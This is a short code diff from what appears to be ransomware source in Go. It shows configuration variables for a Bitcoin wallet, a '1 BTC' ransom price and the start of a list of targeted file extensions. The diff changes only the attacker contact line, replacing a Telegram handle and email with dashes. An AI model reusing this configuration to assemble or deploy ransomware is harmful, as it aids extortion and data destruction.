@@ -29,7 +29,7 @@ var (
 	// Your wallet address
 	Wallet = "17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR"
 	// Your contact email
-	ContactEmail = "@RealNightKing via Telegram or by email at the_nightking@proton.me"
+	ContactEmail = "@----- via Telegram or by email at ------@proton.me"
 	// The ransom to pay
 	Price                 = "1 BTC"
 	InterestingExtensions = []string{
